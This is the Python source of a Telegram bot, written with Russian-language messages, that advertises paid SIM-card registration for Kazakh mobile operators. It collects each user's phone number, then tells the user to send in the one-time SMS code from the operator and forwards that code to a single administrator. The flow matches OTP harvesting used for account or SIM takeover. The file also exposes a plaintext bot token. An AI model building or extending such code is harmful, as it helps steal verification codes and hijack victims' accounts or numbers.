import asyncio
import json
import logging
import os
import tempfile
import re
from pathlib import Path
from typing import Dict, List, Any

from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import CommandStart, Command
from aiogram.types import (
    Message, CallbackQuery, ReplyKeyboardMarkup, KeyboardButton,
    InlineKeyboardMarkup, InlineKeyboardButton
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ================= НАСТРОЙКИ =================
TOKEN = "8623489996:AAE5rfYaS4JbAGrso_veeFALIsLagXx74s8"
ADMIN_ID = 8209617821
PRICE_USD = 2.5
PRICE_TEXT = f"Стоимость регистрации одной SIM-карты: **{PRICE_USD}$**"

DATA_FILE = Path("bot_data.json")
logging.basicConfig(level=logging.INFO)

bot = Bot(token=TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)
router = Router()
dp.include_router(router)

# Глобальные данные
pending_requests: List[Dict[str, Any]] = []
users: set[int] = set()
request_counter: int = 0
data_lock = asyncio.Lock()

# ================= СОСТОЯНИЯ =================
class RegForm(StatesGroup):
    operator = State()
    phone = State()

class AdminForm(StatesGroup):
    broadcast = State()
    search = State()

# ================= JSON =================
async def load_data():
    global pending_requests, users, request_counter
    if not DATA_FILE.exists():
        await save_data()
        return

    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        pending_requests = data.get("pending_requests", [])
        users = set(data.get("users", []))
        request_counter = data.get("request_counter", 0)
        logging.info(f"Загружено {len(pending_requests)} заявок, {len(users)} пользователей")
    except Exception as e:
        logging.error(f"Ошибка загрузки: {e}")
        pending_requests = []
        users = set()
        request_counter = 0
        await save_data()

async def save_data():
    async with data_lock:
        temp_path = Path(tempfile.NamedTemporaryFile(delete=False).name)
        try:
            data = {
                "pending_requests": pending_requests,
                "users": list(users),
                "request_counter": request_counter
            }
            with open(temp_path, "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
            temp_path.replace(DATA_FILE)
        except Exception as e:
            logging.error(f"Ошибка сохранения: {e}")
            try:
                temp_path.unlink()
            except:
                pass

# ================= КЛАВИАТУРЫ =================
def get_main_kb() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="📞 Зарегистрировать SIM")],
            [KeyboardButton(text="💰 Цена и оплата")],
            [KeyboardButton(text="🆘 Поддержка")],
        ],
        resize_keyboard=True,
        row_width=2
    )

def get_operators_kb() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="Activ")],
            [KeyboardButton(text="Tele2")],
            [KeyboardButton(text="Altel")],
            [KeyboardButton(text="← Назад")],
        ],
        resize_keyboard=True
    )

# ================= ВАЛИДАЦИЯ НОМЕРА =================
def is_valid_kz_phone(phone: str) -> bool:
    cleaned = re.sub(r'[\s\-\(\)]', '', phone)
    if not (cleaned.startswith('+7') or cleaned.startswith('8')):
        return False
    if cleaned.startswith('+7') and len(cleaned) != 12:
        return False
    if cleaned.startswith('8') and len(cleaned) != 11:
        return False
    digits_part = cleaned[2:] if cleaned.startswith('+7') else cleaned[1:]
    return digits_part.isdigit()

# ================= ХЕНДЛЕРЫ =================
@router.message(CommandStart())
async def cmd_start(message: Message):
    users.add(message.chat.id)
    if len(users) % 5 == 0:
        await save_data()

    await message.answer(
        f"⚠️ Добро пожаловать в систему.\n"
        f"Контроль — иллюзия.\n\n"
        f"{PRICE_TEXT}\n\n"
        f"Выбери действие:",
        reply_markup=get_main_kb(),
        parse_mode="Markdown"
    )

@router.message(F.text == "💰 Цена и оплата")
async def show_price(message: Message):
    text = (
        f"{PRICE_TEXT}\n\n"
        "После успешной регистрации вы получите реквизиты для оплаты.\n"
        "Принимаем USDT, Kaspi, Halyk, Freedom, перевод.\n"
        "Укажите номер заявки при оплате."
    )
    await message.answer(text, parse_mode="Markdown", reply_markup=get_main_kb())

@router.message(F.text == "🆘 Поддержка")
async def support_handler(message: Message):
    await bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
    await bot.send_message(ADMIN_ID, f"Поддержка от @{message.from_user.username or message.chat.id}")
    await message.answer("Запрос отправлен. Жди ответа.")

@router.message(F.text == "📞 Зарегистрировать SIM")
async def start_reg(message: Message, state: FSMContext):
    await message.answer("Выбери оператора:", reply_markup=get_operators_kb())
    await state.set_state(RegForm.operator)

@router.message(RegForm.operator, F.text.in_({"Activ", "Tele2", "Altel"}))
async def choose_operator(message: Message, state: FSMContext):
    await state.update_data(operator=message.text)
    await message.answer(
        f"Оператор: {message.text}\n\n"
        "Введи номер телефона (пример: +77001234567 или 87051234567):"
    )
    await state.set_state(RegForm.phone)

@router.message(RegForm.phone)
async def process_phone(message: Message, state: FSMContext):
    global request_counter
    phone = message.text.strip()

    if not is_valid_kz_phone(phone):
        await message.answer(
            "❌ Неверный формат номера.\n\n"
            "Правильные примеры:\n"
            "• +77001234567\n"
            "• 87051234567\n"
            "• +77471234567\n\n"
            "Попробуй ещё раз:"
        )
        return

    data = await state.get_data()
    op = data.get("operator")

    request_counter += 1
    rid = request_counter

    pending_requests.append({
        "id": rid,
        "user_id": message.chat.id,
        "username": message.from_user.username or "без ника",
        "first_name": message.from_user.first_name,
        "operator": op,
        "phone": phone,
        "status": "pending",
        "sms_code": None,
        "dialog_active": False,
        "created": int(asyncio.get_event_loop().time())
    })

    await message.answer(
        f"Заявка #{rid} отправлена.\nОжидайте решения.\n\n{PRICE_TEXT}",
        reply_markup=get_main_kb(),
        parse_mode="Markdown"
    )

    admin_text = (
        f"🆕 ЗАЯВКА #{rid}\n"
        f"👤 {message.from_user.first_name} (@{message.from_user.username or 'нет'})\n"
        f"🆔 {message.chat.id}\n"
        f"📶 {op}\n"
        f"📱 {phone}\n"
        f"💰 {PRICE_USD}$"
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Зарегистрировать", callback_data=f"reg_{rid}")],
        [InlineKeyboardButton(text="❌ Отклонить", callback_data=f"rej_{rid}")]
    ])

    await bot.send_message(ADMIN_ID, admin_text, reply_markup=kb)
    await state.clear()
    await save_data()

@router.message(F.text == "← Назад")
async def back_to_menu(message: Message, state: FSMContext):
    await state.clear()
    await message.answer("Главное меню", reply_markup=get_main_kb())

# ================= CALLBACK ХЕНДЛЕРЫ =================
@router.callback_query(F.data.startswith("reg_"))
async def start_registration(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("Доступ запрещён", show_alert=True)
        return

    try:
        rid = int(callback.data.split("_")[1])
    except:
        await callback.answer("Ошибка в номере заявки", show_alert=True)
        return

    for req in pending_requests:
        if req["id"] == rid and req["status"] == "pending":
            req["status"] = "waiting_sms_code"
            req["dialog_active"] = True

            await callback.message.edit_text(
                callback.message.text + "\n\n🔄 Запрос кода SMS отправлен клиенту...",
                reply_markup=None
            )

            await bot.send_message(
                req["user_id"],
                "✅ Администратор начал регистрацию.\n\n"
                "Введите **код из SMS**, который пришёл на ваш номер от оператора.\n"
                "(обычно 4–6 цифр)\n\n"
                "Просто напишите его сюда:"
            )

            await bot.send_message(
                ADMIN_ID,
                f"Заявка #{rid}: ожидание кода SMS от клиента."
            )

            await save_data()
            await callback.answer("Запрос кода отправлен клиенту")
            return

    await callback.answer("Заявка уже обработана или не найдена", show_alert=True)


@router.callback_query(F.data.startswith("rej_"))
async def reject_request(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("Доступ запрещён", show_alert=True)
        return

    try:
        rid = int(callback.data.split("_")[1])
    except:
        await callback.answer("Ошибка в номере заявки", show_alert=True)
        return

    for req in pending_requests:
        if req["id"] == rid and req["status"] == "pending":
            req["status"] = "rejected"
            req["dialog_active"] = False

            await bot.send_message(req["user_id"], f"❌ Заявка #{rid} отклонена.")
            await callback.message.edit_text(callback.message.text + f"\n\n❌ Отклонено #{rid}")
            await save_data()
            await callback.answer("Заявка отклонена")
            return

    await callback.answer("Заявка уже обработана", show_alert=True)


@router.callback_query(F.data.startswith("finish_"))
async def finish_registration(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("Доступ запрещён", show_alert=True)
        return

    try:
        rid = int(callback.data.split("_")[1])
    except:
        await callback.answer("Ошибка в номере заявки", show_alert=True)
        return

    for req in pending_requests:
        if req["id"] == rid and req["status"] in ["sms_received", "waiting_sms_code"]:
            req["status"] = "registered"
            req["dialog_active"] = False

            await bot.send_message(
                req["user_id"],
                f"🎉 SIM-карта #{rid} успешно зарегистрирована!\n"
                f"Оператор: {req['operator']}\n"
                f"Номер: {req['phone']}\n\n"
                "Спасибо за использование сервиса!"
            )

            await callback.message.edit_text(
                callback.message.text + "\n\n✅ Регистрация завершена"
            )

            await save_data()
            await callback.answer("Регистрация завершена")
            return

    await callback.answer("Заявка не готова к завершению", show_alert=True)


# ================= ОБЩИЙ ХЕНДЛЕР СООБЩЕНИЙ (для кода SMS и диалога) =================
@router.message()
async def handle_dialog_messages(message: Message):
    if message.chat.id == ADMIN_ID:
        # Пока админ пишет — ничего не делаем (можно добавить отправку клиенту позже)
        return

    for req in pending_requests:
        if req["user_id"] == message.chat.id and req["dialog_active"]:
            if req["status"] == "waiting_sms_code":
                code = message.text.strip()
                if code.isdigit() and 4 <= len(code) <= 6:
                    req["sms_code"] = code
                    req["status"] = "sms_received"
                    await save_data()

                    await message.answer("Код принят. Администратор проверяет...")

                    kb = InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton("🏁 Завершить регистрацию", callback_data=f"finish_{req['id']}")],
                        [InlineKeyboardButton("❌ Отклонить", callback_data=f"rej_{req['id']}")]
                    ])

                    await bot.send_message(
                        ADMIN_ID,
                        f"Заявка #{req['id']} — клиент ввёл код SMS: **{code}**\n"
                        f"Номер: {req['phone']}\n"
                        f"Оператор: {req['operator']}\n\n"
                        "Что дальше?",
                        reply_markup=kb,
                        parse_mode="Markdown"
                    )
                else:
                    await message.answer("Код должен состоять из 4–6 цифр. Попробуйте ещё раз:")
                return

            # Если статус другой — просто пересылаем админу
            await bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
            return

# ================= АДМИН-ПАНЕЛЬ (оставляем как есть) =================
@router.message(Command("admin"))
async def admin_panel(message: Message):
    if message.chat.id != ADMIN_ID:
        return

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📋 Все заявки",        callback_data="list_all_1")],
        [InlineKeyboardButton(text="⏳ Только новые",      callback_data="list_pending_1")],
        [InlineKeyboardButton(text="🔍 Поиск по номеру",   callback_data="search_phone")],
        [InlineKeyboardButton(text="🔍 Поиск по ID",       callback_data="search_id")],
        [InlineKeyboardButton(text="📢 Рассылка всем",     callback_data="broadcast")],
        [InlineKeyboardButton(text="⟳ Обновить панель",    callback_data="admin_menu")]
    ])

    await message.answer(
        f"🛠️ АДМИН ПАНЕЛЬ\n"
        f"Цена за регистрацию: {PRICE_USD}$\n\n"
        f"Выбери действие:",
        reply_markup=kb
    )

# ================= СПИСОК ЗАЯВОК (оставляем как было) =================
async def generate_requests_list(page: int = 1, per_page: int = 8, status: str | None = None, search: str | None = None, field: str = "phone") -> tuple[str, InlineKeyboardMarkup | None]:
    filtered = [
        r for r in pending_requests
        if (status is None or r["status"] == status)
        and (search is None or search.lower() in str(r.get(field, "")).lower())
    ]

    total = len(filtered)
    start = (page - 1) * per_page
    items = filtered[start : start + per_page]

    if not items:
        return "Нет подходящих заявок.", None

    lines = [f"Заявки | стр {page}/{max(1, (total + per_page - 1)//per_page)} | всего {total}\n"]
    for r in items:
        emoji = "⏳" if r["status"] == "pending" else "✅" if r["status"] == "registered" else "❌"
        lines.append(f"{emoji} #{r['id']} | {r['operator']} | {r['phone']}")
        lines.append(f"   @{r['username']} | {r['first_name']} | {r['user_id']}\n")

    text = "".join(lines)

    kb = InlineKeyboardMarkup(inline_keyboard=[])

    for r in items:
        if r["status"] == "pending":
            kb.inline_keyboard.append([
                InlineKeyboardButton(text=f"✅ #{r['id']}", callback_data=f"reg_{r['id']}"),
                InlineKeyboardButton(text=f"❌ #{r['id']}", callback_data=f"rej_{r['id']}")
            ])

    if page > 1:
        kb.inline_keyboard.append([InlineKeyboardButton(text="← Назад", callback_data=f"list_{status or 'all'}_{page-1}")])

    if start + per_page < total:
        kb.inline_keyboard.append([InlineKeyboardButton(text="Вперёд →", callback_data=f"list_{status or 'all'}_{page+1}")])

    kb.inline_keyboard.append([InlineKeyboardButton(text="↩ Админ меню", callback_data="admin_menu")])

    return text, kb

@router.callback_query(F.data.startswith("list_"))
async def list_requests(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("Доступ запрещён")
        return

    parts = callback.data.split("_")
    filter_type = parts[1] if len(parts) > 2 else "all"
    page = int(parts[-1]) if parts[-1].isdigit() else 1

    status = None if filter_type == "all" else "pending" if filter_type == "pending" else None

    text, kb = await generate_requests_list(page=page, status=status)
    await callback.message.edit_text(text, reply_markup=kb)
    await callback.answer()

# ================= ЗАПУСК =================
async def main():
    await load_data()
    await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())

if __name__ == "__main__":
    asyncio.run(main())